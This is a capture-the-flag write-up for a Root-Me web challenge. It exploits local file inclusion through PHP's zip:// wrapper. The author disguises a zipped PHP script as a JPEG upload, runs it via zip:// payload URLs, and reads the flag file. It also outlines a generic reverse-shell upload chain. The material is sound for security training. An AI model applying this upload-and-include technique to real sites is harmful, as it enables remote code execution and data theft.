# Local-File-Inclusion: Wrappers
### 1. Recon

![image](https://user-images.githubusercontent.com/106916011/179256914-37030c33-4e06-4db5-8c48-f33b7af78912.png)

Here, the website provide a Image upload to user, so I will upload a jpeg file for testing.
After processing successfully, The image is embedded into the surface of the website. Use view-source to see how it embedded

![image](https://user-images.githubusercontent.com/106916011/179350737-604a09e6-6848-4e01-a7aa-9b5a19142e97.png)

Now, because I got a hint "Wrappers" and this image upload function then I'm gotta look up a Wrapper relating to a file handler.
The outcome is Wrapper zip:// which is satisfied my condition. The zip wrapper processes uploaded .zip files server side allowing the upload of a zip file using a vulnerable file function exploitation of the zip filter via an LFI to execute. A typical attack example would look like:
1. Create a PHP reverse shell
2. Compress to a .zip file
3. Upload the compressed shell payload to the server
4. Use the zip wrapper to extract the payload using: php?page=zip://path/to/file.zip%23shell
5. The above will extract the zip file to shell, if the server does not append .php rename it to shell.php instead

To confirm if PHP ZIP Wrapper is available on this website, I send a random payload:
```powershell
http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://shell.jpg%23payload
```
And server sends back a response 
![image](https://user-images.githubusercontent.com/106916011/179352866-9c40ae61-22fd-43ee-ad5a-44350fcc73fa.png)
not any errors about zip:// is not supported so it is worth trying.

### 2. Exploit
creating a php file to scan every directory.
```powershell
<?php
$path = getcwd();
$items = scandir($path);

echo "<p>Content of $path</p>";
echo '<ul>';
foreach ($items as $item) {
    echo '<li>' . $item . '</li>';
}
echo '</ul>';
?> 
```
I zip it and rename to .JPG (the php:zip:// wrapper does not require the zip file to have any specific extension) then upload to server via image upload function.
appending its source dir to our payload, and there is my payload:
```powershell
http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://tmp/upload/jNDpWhjlA.jpg%23a
```

Here, it work very well

![image](https://user-images.githubusercontent.com/106916011/179353937-f587357a-49ee-4e0c-9e76-a72f15039e18.png)

Next, I need to read source of flag-mipkBswUppqwXlq9ZydO.php. Repeat process with reading source php script, I get my challange successful.

![image](https://user-images.githubusercontent.com/106916011/179354098-b4dea985-6db0-4d64-99cd-85ed5736bf46.png)




